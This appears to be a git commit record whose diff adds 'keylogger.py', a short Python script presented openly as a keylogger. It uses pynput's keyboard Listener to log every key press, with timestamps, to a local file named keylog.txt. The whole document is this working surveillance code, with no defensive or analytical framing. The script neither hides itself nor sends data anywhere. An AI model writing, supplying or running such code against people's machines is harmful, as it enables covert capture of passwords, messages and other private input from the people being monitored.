7432446fa81f6e99638bc826db87523a24eaa017
Harshwardhan <harshafartale12@gmail.com>
2021-10-01 00:20:33 +0530

    Python keylogger added

---
+++ keylogger.py
@@ -0,0 +1,12 @@
+#Simple python keylogger
+
+from pynput.keyboard import Key, Listener
+import logging
+ 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+def on_press(key):
+    logging.info(str(key))
+ 
+with Listener(on_press=on_press) as listener :
+    listener.join()
